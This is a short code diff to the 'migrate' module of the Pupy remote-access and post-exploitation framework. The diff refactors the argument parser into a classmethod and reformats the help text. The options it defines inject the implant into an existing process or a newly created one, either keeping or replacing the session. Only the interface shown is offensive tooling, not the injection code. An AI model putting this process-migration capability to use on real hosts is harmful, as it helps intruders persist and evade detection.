@@ -18,17 +18,22 @@ class MigrateModule(PupyModule):
         'windows': ['pupwinutils.processes']
     }
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
-        self.arg_parser.add_argument('--no-wait', action='store_false', default=True,
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="migrate", description=cls.__doc__)
+        cls.arg_parser.add_argument('--no-wait', action='store_false', default=True,
                             help='Does not Hook exit thread function and wait until pupy exists (Linux)')
 
-        group = self.arg_parser.add_mutually_exclusive_group(required=True)
+        group = cls.arg_parser.add_mutually_exclusive_group(required=True)
         group.add_argument('-c', '--create', metavar='<exe_path>',
                             help='create a new process and inject into it')
         group.add_argument('pid', nargs='?', type=int, help='pid')
-        self.arg_parser.add_argument('-k', '--keep', action='store_true' ,help='migrate into the process but create a new session and keep the current pupy session running')
-	self.arg_parser.add_argument('-t', '--timeout', type=int, default=30, help='time in seconds to wait for the connection')
+        cls.arg_parser.add_argument(
+            '-k', '--keep', action='store_true',
+            help='migrate into the process but create a new session and keep the current pupy session running')
+        cls.arg_parser.add_argument(
+            '-t', '--timeout', type=int, default=30,
+            help='time in seconds to wait for the connection')
 
     def run(self, args):
         if self.client.is_windows():
